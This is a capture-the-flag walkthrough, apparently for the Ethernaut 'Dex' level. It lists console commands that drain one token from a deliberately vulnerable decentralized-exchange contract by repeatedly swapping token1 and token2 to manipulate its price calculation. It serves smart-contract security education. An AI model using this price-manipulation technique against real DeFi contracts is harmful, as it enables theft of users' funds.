# Level 22: Dex

### Wargame
The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.
You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

### Key Insights
* price

### Attack Steps
1. Contract Instance Address:
    ```bash
    instance
    '0x0300312e10c967F0eD21e9557BDac0838c928137'
    ```

2. Fetch the token addresses:
    ```bash
    token1 = await contract.token1()
    '0xdd95A13Bd5c771fAC9cD99b0617879eE7ceB56F5'

    token2 = await contract.token2()
    '0xBDdEF6272D6a8c23D57Ea6bd0e08F7760e1a079a'
    ```

3. Check DEX’s token balances:
    ```bash
    balance1 = await contract.balanceOf(token1, instance)
    balance2 = await contract.balanceOf(token2, instance)
    ```

4. Authorize the DEX contract to spend your tokens:
    ```bash
    contract.approve(instance,10000)
    ```

5. Alternately swap token1 and token2 to manipulate the internal DEX pricing:
    ```bash
    > myBalance1 = await contract.balanceOf(token1, player)
    > myBalance2 = await contract.balanceOf(token2, player)
    > contract.swap(token1, token2, myBalance1)

    > myBalance2 = await contract.balanceOf(token2, player)
    > contract.swap(token2, token1, myBalance2)

    > myBalance1 = await contract.balanceOf(token1, player)
    > contract.swap(token1, token2, myBalance1)

    > myBalance2 = await contract.balanceOf(token2, player)
    > contract.swap(token2, token1, myBalance2)

    > myBalance1 = await contract.balanceOf(token1, player)
    > contract.swap(token1, token2, myBalance1)
    ```

6. Final Swap Calculation
    ```bash
    > balance1 = await contract.balanceOf(token1, instance)
    110

    > await contract.getSwapPrice(token2, token1, 100)
    244

    > await contract.getSwapPrice(token2, token1, 45)
    110

    > contract.swap(token2, token1, 45)
    ```

7. Verify DEX's token1 balance is zero:
    ```bash
    > balance1 = await contract.balanceOf(token1, instance)
    0
    ```
